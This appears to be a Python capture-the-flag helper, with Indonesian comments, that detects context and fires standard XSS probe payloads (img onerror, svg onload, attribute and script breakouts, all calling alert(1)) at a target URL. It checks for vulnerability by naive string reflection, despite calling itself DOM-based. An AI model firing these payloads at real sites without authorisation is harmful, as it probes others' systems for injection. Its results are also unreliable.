import re
import requests

class XSSSolver:
    """
    DOM-based XSS solver.
    Menyelesaikan challenge XSS berbasis DOM secara otomatis.
    """
    
    def __init__(self):
        self.xss_payloads = [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            'javascript:alert(1)',
            '\'"<script>alert(1)</script>',
            '<iframe src="javascript:alert(1)">'
        ]
        self.context_patterns = {
            'html_context': r'([^<]*)(<[^>]*>)*',
            'attribute_context': r'([^"\']*)["\'][^"\']*["\']',
            'javascript_context': r'[^"]*"([^"]*)"'
        }
    
    def solve_xss_challenge(self, target_url: str, parameter: str = None):
        """
        Selesaikan challenge XSS.
        """
        results = {
            'target_url': target_url,
            'parameter': parameter,
            'vulnerable': False,
            'payload_used': None,
            'context_detected': None,
            'solution_found': False
        }
        
        try:
            # Deteksi konteks XSS
            context = self._detect_xss_context(target_url, parameter)
            results['context_detected'] = context
            
            # Uji payload berdasarkan konteks
            for payload in self._get_contextual_payloads(context):
                if self._test_xss_payload(target_url, parameter, payload):
                    results.update({
                        'vulnerable': True,
                        'payload_used': payload,
                        'solution_found': True
                    })
                    break
        
        except Exception as e:
            results['error'] = f'XSS solving failed: {str(e)}'
        
        return results
    
    def _detect_xss_context(self, url: str, param: str) -> str:
        """Deteksi konteks XSS."""
        try:
            response = requests.get(url, timeout=10)
            content = response.text.lower()
            
            if param and f'name="{param}"' in content:
                return 'attribute_context'
            elif '<script>' in content:
                return 'javascript_context'
            else:
                return 'html_context'
        except:
            return 'html_context'
    
    def _get_contextual_payloads(self, context: str) -> list:
        """Dapatkan payload berdasarkan konteks."""
        if context == 'attribute_context':
            return ['" onmouseover=alert(1) x="']
        elif context == 'javascript_context':
            return ["'; alert(1); //"]
        else:
            return self.xss_payloads
    
    def _test_xss_payload(self, url: str, param: str, payload: str) -> bool:
        """Uji payload XSS."""
        try:
            if param:
                response = requests.get(url, params={param: payload}, timeout=10)
            else:
                response = requests.post(url, data={'input': payload}, timeout=10)
            
            return 'alert(1)' in response.text or 'onerror' in response.text
        except:
            return False